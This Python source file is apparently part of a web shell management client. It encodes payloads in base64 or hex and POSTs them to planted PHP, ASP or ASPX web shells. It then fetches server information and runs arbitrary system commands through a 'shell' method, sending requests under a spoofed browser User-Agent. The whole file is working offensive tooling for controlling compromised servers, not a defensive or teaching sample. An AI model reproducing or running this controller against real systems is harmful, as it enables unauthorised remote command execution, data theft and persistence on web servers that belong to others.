import binascii as ba
import base64 as b64
from urllib.request import urlopen, Request

from mudao.model import Shell
from mudao.utils.tool import CONF, parse_result
from mudao.utils.logger import logger as log


class ShellBase(Shell):

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._flag = CONF.get('FLAG', 'M@M')
        self._k1 = CONF.get('K1', 'k1')
        self._k2 = CONF.get('K2', 'k2')
        self._k3 = CONF.get('K3', 'k3')
        self._base = self.getbase()

    def getbase(self):
        pl = CONF.get(self._type.upper() + '_BASE', '')
        if self._type.lower() == 'php':
            pl = pl % 'action'
        elif self._type.lower() == 'asp':
            pl = pl % (self._flag, 'action', self._flag)
        elif self._type.lower() == 'aspx':
            pl = pl % (self._flag, 65001, 'action', self._flag)
        # log.debug('Shell Base: %s' % pl)
        return pl

    def generate(self, pl, code='utf-8'):
        pl = pl.encode(code)
        if self._type.lower() == 'asp':
            return self._base.replace('action', ba.hexlify(pl).decode(code))

        if self._type.lower() == 'php':
            flag = 'print "%s";' % self._flag
            pl = flag + pl.decode(code) + flag
            pl = pl.encode(code)
        log.debug('Playload: %s' % pl.decode(code))
        return self._base.replace('action', b64.b64encode(pl).decode(code))

    def getinfo(self):
        pl = CONF.get('GETBASEINFO').get(self._type.upper())
        params = self.generate(pl)
        return self.POST(params)

    def shell(self, cmd_path, cmd):
        pl = CONF.get('SHELL').get(self._type.upper()) % (cmd_path, cmd)
        params = self.generate(pl)
        return self.POST(params)

    def GET(self, params):
        url = self._url + '?' + self._pwd + '=' + params
        return self.request(url, code=self.encoding)

    def POST(self, params):
        data = self._pwd + '=' + params
        log.debug('Params: %s' % params)
        return self.request(self._url, data, self.encoding)

    def request(self, url, data=None, code='utf-8'):
        req = Request(url, data=data.encode(code))
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0')
        try:
            rsp = urlopen(req)
            return rsp.status, rsp.reason, parse_result(rsp.read().decode(code), self._flag)   # .decode(code)
        except Exception as e:
            print(e)
            return 999, 'Exception', e


if __name__ == '__main__':
    s = ShellBase('http://localhost/test.php', 'a', 'php')
    print(s.getinfo())

